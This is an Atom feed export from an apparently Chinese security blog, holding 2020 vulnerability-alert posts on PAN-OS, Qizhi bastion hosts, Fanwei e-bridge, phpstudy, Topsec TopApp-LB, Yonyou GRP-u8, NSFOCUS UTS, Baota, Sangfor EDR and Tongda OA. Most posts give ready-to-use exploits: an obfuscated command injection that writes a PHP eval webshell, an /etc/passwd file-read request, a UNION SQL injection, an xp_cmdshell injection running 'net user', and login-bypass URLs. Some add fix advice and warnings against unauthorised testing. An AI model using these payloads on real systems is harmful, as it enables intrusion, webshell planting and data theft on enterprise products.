  <entry>
    <title>2020HW第二弹</title>
    <link href="https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/"/>
    <id>https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/</id>
    <published>2020-09-12T17:35:26.051Z</published>
    <updated>2020-09-18T02:02:26.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PAN-OS远程代码执行漏洞（CVE-2020-2040）"><a href="#PAN-OS远程代码执行漏洞（CVE-2020-2040）" class="headerlink" title="PAN-OS远程代码执行漏洞（CVE-2020-2040）"></a>PAN-OS远程代码执行漏洞（CVE-2020-2040）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>PAN-OS是一个运行在Palo Alto Networks防火墙和企业VPN设备上的操作系统。近日PAN-OS被曝出存在远程代码执行漏洞。</p><p>该漏洞是PAN-OS上的一个缓冲区溢出漏洞，当启用了强制门户或配置了多重身份验证（MFA）时，未经身份验证的攻击者可通过向Captive Portal或Multi-Factor  Authentication接口发送恶意请求进行利用，可能导致系统进程中断，并允许使用root特权在PAN-OS设备上执行任意代码。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>目前官方已针对此漏洞发布了更新版本，请受影响的用户尽快升级至安全版本进行防护，官方更新指南：</p><p><a href="https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html" target="_blank" rel="noopener">https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html</a></p><h2 id="齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）"><a href="#齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）" class="headerlink" title="齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）"></a>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>无需登录</p><p>利用过程:</p><p>　　第一，<a href="http://10.20.10.11/listener/cluster_manage.php返回“OK”。" target="_blank" rel="noopener">http://10.20.10.11/listener/cluster_manage.php返回“OK”。</a></p><p>　　第二，执行以下链接即可getshell，执行成功后，生成PHP一句话马/var/www/shterm/resources/qrcode/lbj77.php密码10086。这里假设10.20.10.10为堡垒机的IP地址。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=10.20.10.11&amp;node_id=1$&#123;IFS&#125;|`echo$&#123;IFS&#125;"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64$&#123;IFS&#125;-d|bash`|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br></pre></td></tr></table></figure><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>　　$node_id的看起来应该是一个整数，所以只需在ha_request.php文件开头，添加以下一行代码，对该变量进行过滤即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　$node_id = @intval($req_node_id);</span><br></pre></td></tr></table></figure><h2 id="泛微云桥任意文件读取漏洞"><a href="#泛微云桥任意文件读取漏洞" class="headerlink" title="泛微云桥任意文件读取漏洞"></a>泛微云桥任意文件读取漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>泛微云桥是一个为了满足用户提出的阿里钉钉与泛微OA集成需求,近日,泛微与阿里钉钉工程师多方联合,集合内部研发力量共同完成的“泛微云桥e-bridge平台”，近日泛微云桥被曝出存在任意文件读取漏洞。</p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>　　该漏洞几乎影响2018-2019全版本。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p>将相应包中的id提交</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/file/fileNoLogin/xxxxxxxxxx</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>去官网更新最新版本。</p><h2 id="网瑞达webVPN-RCE漏洞"><a href="#网瑞达webVPN-RCE漏洞" class="headerlink" title="网瑞达webVPN RCE漏洞"></a>网瑞达webVPN RCE漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。近日网瑞达的webVPN被曝出存在RCE的漏洞。</p><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>去官网更新最新版本</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PAN-OS远程代码执行漏洞（CVE-2020-2040）&quot;&gt;&lt;a href=&quot;#PAN-OS远程代码执行漏洞（CVE-2020-2040）&quot; class=&quot;headerlink&quot; title=&quot;PAN-OS远程代码执行漏洞（CVE-2020-2040）&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy默认配置nginx存在解析漏洞</title>
    <link href="https://yejinpoxiao.xyz/2020/09/11/phpstudy%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AEnginx%E5%AD%98%E5%9C%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yejinpoxiao.xyz/2020/09/11/phpstudy%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AEnginx%E5%AD%98%E5%9C%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-11T11:16:54.440Z</published>
    <updated>2020-09-11T11:18:27.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="告警信息"><a href="#告警信息" class="headerlink" title="告警信息"></a>告警信息</h2><p>2020年09月03日，国内安全团队监测发现 phpstudy 发布了phpstudy 安全配置错误漏洞的风险通告，该漏洞等级为高危；phpStudy 默认配置存在 nginx 解析漏洞。</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>由于 cgi.fix_pathinfo=1  使用默认配置，效果为当前目录下文件不存在，则采用上层路径；由于info.jpg文件，而后缀是jpg，php配置文件php-fpm.conf 中的 security.limit_extensions  参数值决定了jpg是否可以解析成php，而由于windows版本中没有此文件所以默认都可以解析为php，再加上php.ini参数cgi.fix_pathinfo使用默认配置，导致Windows下 phpstudy存在nginx解析漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>win：phpstudy : &lt;=8.1.0.7</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动phpstudy</p><p><img src="0.png" alt="0"></p><p>放个图片码到web目录</p><p><img src="1.png" alt="1"></p><p>蚂剑连接一句话木马成功。</p><p><img src="2.png" alt="2"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>更新到最新版</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;告警信息&quot;&gt;&lt;a href=&quot;#告警信息&quot; class=&quot;headerlink&quot; title=&quot;告警信息&quot;&gt;&lt;/a&gt;告警信息&lt;/h2&gt;&lt;p&gt;2020年09月03日，国内安全团队监测发现 phpstudy 发布了phpstudy 安全配置错误漏洞的风险通告，该漏洞等
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>天融信TopApp-LB 负载均衡系统sql注入</title>
    <link href="https://yejinpoxiao.xyz/2020/09/11/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/"/>
    <id>https://yejinpoxiao.xyz/2020/09/11/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/</id>
    <published>2020-09-11T10:57:40.855Z</published>
    <updated>2020-09-11T11:28:37.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>天融信负载均衡系统TopApp为用户提供高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及多数据中心的全局负载均衡解决方案。TopApp集成了压缩、缓存、SSL卸载等网络优化技术来加速业务系统交付的整个过程，提升业务系统处理效率；同时结合Web应用防火墙、DNS防火墙、DDOS攻击防护及漏洞扫描等技术手段形成全方位的网络安全防护，为用户业务系统的安全保驾护航。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/acc/clsf/report/datasource.php</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Host:</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept</span>: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line"></span><br><span class="line"><span class="attribute">X-Prototype-Version</span>: 1.6.0.3</span><br><span class="line"></span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: cors</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: empty</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Length</span>: 201</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@ ......</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;天融信负载均衡系统TopApp为用户提供高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>用友GRP-u8 注入POC</title>
    <link href="https://yejinpoxiao.xyz/2020/09/11/%E7%94%A8%E5%8F%8BGRP-u8%20%E6%B3%A8%E5%85%A5POC/"/>
    <id>https://yejinpoxiao.xyz/2020/09/11/%E7%94%A8%E5%8F%8BGRP-u8%20%E6%B3%A8%E5%85%A5POC/</id>
    <published>2020-09-11T10:52:55.742Z</published>
    <updated>2020-09-11T10:55:02.357Z</updated>
    
    <content type="html"><![CDATA[<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Proxy</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept</span>: Accept: */*</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 6.0;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span>: host</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Length</span>: 357</span><br><span class="line"></span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">cVer=9.8.0&amp;dp=&lt;?xml version="1.0" encoding="GB2312"?&gt;&lt;R9PACKET version="1"&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format="text"&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format="text"&gt;exec xp_cmdshell 'net user'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;POC&quot;&gt;&lt;a href=&quot;#POC&quot; class=&quot;headerlink&quot; title=&quot;POC&quot;&gt;&lt;/a&gt;POC&lt;/h2&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>绿盟UTS综合威胁探针管理员任意登录</title>
    <link href="https://yejinpoxiao.xyz/2020/09/11/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/"/>
    <id>https://yejinpoxiao.xyz/2020/09/11/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/</id>
    <published>2020-09-11T10:29:40.876Z</published>
    <updated>2020-09-11T10:49:50.069Z</updated>
    
    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>V2.0R00F02SP02及之前版本</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p><p><img src="1.png" alt="1"></p><p>释放请求包，对响应包进行修改，将false更改为true</p><p><img src="2.png" alt="2"></p><p><img src="3.png" alt="3"></p><p>可以看到相应包回显了密码md5后的密文</p><p><img src="4.png" alt="4"></p><p>将此md5替换登录的请求包，成功登录</p><p><img src="5.png" alt="5"></p><p><img src="6.png" alt="6"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="http://update.nsfocus.com/update/listBsaUtsDetail/v/F02" target="_blank" rel="noopener">http://update.nsfocus.com/update/listBsaUtsDetail/v/F02</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>宝塔数据库未授权访问漏洞</title>
    <link href="https://yejinpoxiao.xyz/2020/08/23/%E5%AE%9D%E5%A1%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yejinpoxiao.xyz/2020/08/23/%E5%AE%9D%E5%A1%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-23T14:59:51.686Z</published>
    <updated>2020-08-23T15:11:04.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>宝塔面板是提升运维效率的服务器管理软件，支持一键LAMP/LNMP/集群/监控/网站/FTP/数据库/JAVA等100多项服务器管理功能。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Linux版本 7.4.2版本</p><p>Linux测试版本 7.5.14版本</p><p>Windows版 6.8版本</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>环境部署了phpmyadmin</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload ： <a href="http://ip:888/pma/" target="_blank" rel="noopener">http://ip:888/pma/</a></p><p><img src="0.png" alt="0"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>升级宝塔面板至最新版本 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;宝塔面板是提升运维效率的服务器管理软件，支持一键LAMP/LNMP/集群/监控/网站/FTP/数据库/JAVA等100多项服
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>深x服EDR终端检测平台存在任意用户登录漏洞</title>
    <link href="https://yejinpoxiao.xyz/2020/08/20/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yejinpoxiao.xyz/2020/08/20/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-20T01:58:52.867Z</published>
    <updated>2020-08-23T15:12:18.716Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试。</p><p>注：禁止非授权入侵</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload: <a href="https://ip/ui/login.php?user=arbitrarily" target="_blank" rel="noopener">https://ip/ui/login.php?user=arbitrarily</a></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="0.png" alt="0"></p><p>利用payload进行任意登录</p><p><img src="1.png" alt="1"></p><h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>及时进行更新，关注官网补丁信息。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试。&lt;/p&gt;
&lt;p&gt;注：禁止非授权入侵&lt;/p&gt;
&lt;h2 id=&quot;漏洞
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意文件删除实现getshell</title>
    <link href="https://yejinpoxiao.xyz/2020/08/19/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%9E%E7%8E%B0getshell/"/>
    <id>https://yejinpoxiao.xyz/2020/08/19/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%9E%E7%8E%B0getshell/</id>
    <published>2020-08-19T14:46:18.739Z</published>
    <updated>2020-08-19T14:58:11.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>​         通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。     </p><p>通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。     </p><p>此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。     </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地搭建通达OA环境，本次试验使用版本为11.6（其余版本自行测试）</p><p><img src="0.png" alt="0"></p><p>使用exp脚本进行getshell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 tongdaOA_rce.py http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">133</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><p>成功上传一句话，连接webshell</p><p><img src="2.png" alt="2"></p><p>注：此漏洞利用会导致删除inc文件夹下的auth.inc.php，从而导致系统无法正常使用，禁止进行未授权测试。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;​         通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>深x服EDR v3.2.21 (20200703)源码泄露</title>
    <link href="https://yejinpoxiao.xyz/2020/08/19/%E6%B7%B1x%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>https://yejinpoxiao.xyz/2020/08/19/%E6%B7%B1x%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</id>
    <published>2020-08-19T04:56:48.669Z</published>
    <updated>2020-08-23T15:11:58.049Z</updated>
    
